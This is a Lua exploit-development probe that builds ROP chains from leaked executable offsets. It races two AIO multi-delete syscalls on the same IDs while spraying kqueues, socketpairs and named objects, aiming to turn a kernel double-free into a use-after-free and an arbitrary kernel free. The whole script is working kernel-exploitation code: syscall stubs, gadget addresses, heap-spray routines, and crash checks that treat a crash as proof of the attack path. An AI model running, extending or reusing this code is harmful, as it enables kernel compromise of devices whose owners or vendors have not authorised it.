-- CRASH_CLASS: HIGH
-- PROBE 65o: concurrent spray during aio_multi_delete race
--
-- 65n showed spray AFTER the race doesn't reclaim AIO slots.
-- Per Jose's analysis: the exploit needs spray BETWEEN the two
-- children's deletes on the same ID:
--   1. Child A locks, finds AIO obj, unlocks → frees sub-objects
--   2. **Spray child reclaims the freed AIO slot** with controlled data
--   3. Child B locks, finds SAME ID (still in table), unlocks →
--      reads "sub-object pointers" from OUR controlled data →
--      frees whatever we point to → ARBITRARY KERNEL FREE
--
-- This probe runs 3 concurrent children:
--   Child A: 662(ids, 16, states_A)        — first deleter
--   Child B: 662(ids, 16, states_B)        — second deleter (races A)
--   Child S: 200× kqueue(362) creates      — spray during the race
-- Plus main Lua thread sprays namedobjs during spin-wait.
--
-- If the spray reclaims an AIO slot and the second delete reads
-- our controlled pointers, the process will crash (kernel page
-- fault on fake sub-object pointers). A crash = progress.

print("=== PROBE 65o: concurrent spray during race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS, SIGSEGV, SIGBUS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- AIO helpers
local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- Build a child ROP that calls 662(del_ids, count, states) then thr_exit(0)
local function build_delete_child(del_ids_addr, count, states_addr, marker_addr, marker_val)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    -- Write marker
    emit(g_pop_rax); emit(uint64(marker_val))
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- 662 syscall
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    -- thr_exit
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    -- thr_param
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)         -- start_func = bare_ret (will jump to stack ROP)
    wq(N(par) + 0x10, uint64(sb))  -- stack_base
    wq(N(par) + 0x18, uint64(0x2000)) -- stack_size
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

-- Build a spray child that creates N kqueues then exits
-- Each kqueue(362) call: pop_rax(362) + stub = 3 gadgets = 24 bytes
-- Also stores kq fd to result array via mov [rdi], rax
local function build_kqueue_spray_child(count, result_base, marker_addr)
    local stk = memory.alloc(0x10000) -- 64KB stack for lots of ROP
    local sb = N(stk)
    local rsp = sb + 0x8000 - ((sb + 0x8000) % 16) - 8
    for i = 0, 0x7FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    -- Write start marker
    emit(g_pop_rax); emit(uint64(0x53535353))
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- Create kqueues
    for i = 0, count - 1 do
        emit(g_pop_rax); emit(uint64(362))
        emit(stub)
        -- Store fd: mov [result_base + i*8], rax
        emit(g_pop_rdi); emit(uint64(result_base + i * 8))
        emit(g_mov_m_rax)
    end
    -- Write done marker
    emit(g_pop_rax); emit(uint64(0x54545454))
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- thr_exit
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    print(string.format("  spray child ROP: %d bytes", off))
    -- thr_param
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x8000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

-- Build a spray child that creates socketpairs (2 fds each, creates socket objects)
local function build_socketpair_spray_child(count, result_base, marker_addr)
    local stk = memory.alloc(0x10000)
    local sb = N(stk)
    local rsp = sb + 0x8000 - ((sb + 0x8000) % 16) - 8
    for i = 0, 0x7FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    -- Start marker
    emit(g_pop_rax); emit(uint64(0x53535353))
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- socketpair(AF_UNIX=1, SOCK_STREAM=1, 0, &result_base[i*8])
    for i = 0, count - 1 do
        emit(g_pop_rdi); emit(uint64(1))   -- AF_UNIX
        emit(g_pop_rsi); emit(uint64(1))   -- SOCK_STREAM
        emit(g_pop_rdx); emit(uint64(0))   -- protocol
        emit(g_pop_rcx); emit(uint64(result_base + i * 8)) -- fd pair output
        emit(g_pop_rax); emit(uint64(135)) -- socketpair
        emit(stub)
    end
    -- Done marker
    emit(g_pop_rax); emit(uint64(0x54545454))
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- thr_exit
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    print(string.format("  socketpair spray ROP: %d bytes", off))
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x8000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

-- Shared state
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local marker_S = memory.alloc(8)

-- Spray result buffers
local SPRAY_KQ_COUNT = 200
local SPRAY_SP_COUNT = 100
local spray_kq_results = memory.alloc(8 * SPRAY_KQ_COUNT + 0x10)
local spray_sp_results = memory.alloc(8 * SPRAY_SP_COUNT + 0x10)

-- [A] Test spray child works
print("[A] Test spray child")
for i = 0, SPRAY_KQ_COUNT * 8, 8 do wq(N(spray_kq_results) + i, uint64(0xDEAD)) end
wq(N(marker_S), uint64(0))
local test_par = build_kqueue_spray_child(10, N(spray_kq_results), N(marker_S))
pcall(function() mk(455)(test_par, uint64(0x38)) end)
for w = 1, 30000 do local _ = rd(N(marker_S)) end
local test_marker = N(rq(N(marker_S)))
print(string.format("  marker=0x%X", test_marker))
local test_kqs = 0
for i = 0, 9 do
    local v = rq(spray_kq_results + i * 8)
    local fd = sgn(v)
    if fd >= 0 then
        test_kqs = test_kqs + 1
        pcall(function() mk(6)(uint64(fd)) end) -- close
    end
end
print(string.format("  kqueues created: %d/10", test_kqs))

if not alive() then print("DEAD after test"); return end

-- [B] Race with concurrent spray — multiple iterations
print("")
print("[B] RACE + CONCURRENT SPRAY — 20 iterations")

local ITERS = 20
local total_doubles = 0
local crashes = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** PROCESS DEAD ***", iter))
        crashes = crashes + 1
        break
    end

    -- Submit + poll
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    if #ids < 4 then
        print(string.format("  iter %d: only %d IDs, skipping", iter, #ids))
        break
    end

    local count = #ids
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))
    wq(N(marker_S), uint64(0))

    -- Clear spray results
    for i = 0, SPRAY_KQ_COUNT - 1 do wq(N(spray_kq_results) + i * 8, uint64(0xFFFFFFFF)) end

    -- Build all three children
    local par_A = build_delete_child(N(del_ids), count, N(states_A), N(marker_A), 0x41414141)
    local par_B = build_delete_child(N(del_ids), count, N(states_B), N(marker_B), 0x42424242)
    local par_S = build_kqueue_spray_child(SPRAY_KQ_COUNT, N(spray_kq_results), N(marker_S))

    -- Spawn all three as close together as possible
    -- Spray child first so it's already allocating when deleters start
    pcall(function() mk(455)(par_S, uint64(0x38)) end)
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Main thread also sprays namedobjs during wait
    local lua_spray = {}
    for w = 1, 200 do
        local name = put_str(string.format("r%d_%04d", iter, w))
        local ok2, rv2 = pcall(function() return mk(557)(uint64(N(name)), uint64(0xBEEF0000 + w), uint64(0)) end)
        if ok2 and N(rv2) > 0 then table.insert(lua_spray, N(rv2)) end
    end

    -- Wait for children
    for w = 1, 30000 do local _ = rd(N(del_ids)) end

    if not alive() then
        print(string.format("  iter %d: *** CRASHED DURING RACE — UAF HIT! ***", iter))
        crashes = crashes + 1
        break
    end

    -- Count doubles
    local doubles = 0
    local a_ok = 0
    local b_ok = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    -- Check spray child
    local s_marker = N(rq(N(marker_S)))
    local spray_created = 0
    for i = 0, SPRAY_KQ_COUNT - 1 do
        local v = rq(spray_kq_results + i * 8)
        if v ~= nil and sgn(v) >= 0 and N(v) ~= 0xFFFFFFFF then
            spray_created = spray_created + 1
        end
    end

    -- Close spray kqueues
    local spray_close_fail = 0
    for i = 0, SPRAY_KQ_COUNT - 1 do
        local v = rq(spray_kq_results + i * 8)
        if v ~= nil and sgn(v) >= 0 and N(v) ~= 0xFFFFFFFF then
            local ok3 = pcall(function() mk(6)(uint64(sgn(v))) end)
            if not ok3 then spray_close_fail = spray_close_fail + 1 end
        end
    end

    -- Clean up Lua spray
    local lua_fail = 0
    for _, h in ipairs(lua_spray) do
        local ok4, rv4 = pcall(function() return mk(558)(uint64(h)) end)
        if not ok4 or sgn(rv4) ~= 0 then lua_fail = lua_fail + 1 end
    end

    if doubles > 0 or spray_close_fail > 0 or lua_fail > 0 or iter <= 3 or iter == ITERS then
        print(string.format("  iter %d: doubles=%d A=%d B=%d spray=%d/%d(fail_close=%d) lua=%d(fail=%d) smark=0x%X",
            iter, doubles, a_ok, b_ok,
            spray_created, SPRAY_KQ_COUNT, spray_close_fail,
            #lua_spray, lua_fail,
            s_marker))
    elseif iter == 4 then
        print("  ...")
    end
end

print("")
print("[C] SUMMARY")
print(string.format("  total double-frees: %d", total_doubles))
print(string.format("  crashes:            %d", crashes))
print(string.format("  process:            %s", alive() and "ALIVE" or "DEAD"))

if crashes > 0 then
    print("")
    print("*** CRASH = spray reclaimed AIO slot, second delete read our pointers ***")
    print("*** This confirms the exploitation path! ***")
elseif total_doubles > 0 then
    print("")
    print("Double-frees confirmed but no spray reclaim detected.")
    print("Try different spray objects or increase spray count.")
end

print("")
print("=== 65o COMPLETE ===")
